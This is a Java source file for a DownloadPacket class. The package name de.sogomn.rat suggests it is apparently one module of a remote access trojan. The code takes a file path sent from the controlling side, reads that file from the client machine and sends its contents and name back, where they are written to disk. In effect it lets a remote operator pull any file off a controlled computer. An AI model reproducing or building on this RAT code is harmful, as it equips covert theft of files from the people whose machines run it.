package de.sogomn.rat.packet;

import java.io.File;

import de.sogomn.engine.util.FileUtils;
import de.sogomn.rat.ActiveClient;

public final class DownloadPacket extends AbstractPingPongPacket {
	
	private String path, fileName;
	private byte[] data;
	
	public DownloadPacket(final String path) {
		this.path = path;
		
		type = REQUEST;
	}
	
	public DownloadPacket() {
		this("");
		
		type = DATA;
	}
	
	@Override
	protected void sendRequest(final ActiveClient client) {
		client.writeUTF(path);
	}
	
	@Override
	protected void sendData(final ActiveClient client) {
		client.writeInt(data.length);
		client.writeUTF(fileName);
		client.write(data);
	}
	
	@Override
	protected void receiveRequest(final ActiveClient client) {
		path = client.readUTF();
	}
	
	@Override
	protected void receiveData(final ActiveClient client) {
		final int length = client.readInt();
		
		data = new byte[length];
		fileName = client.readUTF();
		
		client.read(data);
	}
	
	@Override
	protected void executeRequest(final ActiveClient client) {
		final File file = new File(path);
		
		if (file.exists() && !file.isDirectory()) {
			fileName = file.getName();
			data = FileUtils.readExternalData(path);
			type = DATA;
			
			client.addPacket(this);
		}
	}
	
	@Override
	protected void executeData(final ActiveClient client) {
		FileUtils.createFile(fileName);
		FileUtils.writeData(fileName, data);
	}
	
	public String getFileName() {
		return fileName;
	}
	
}
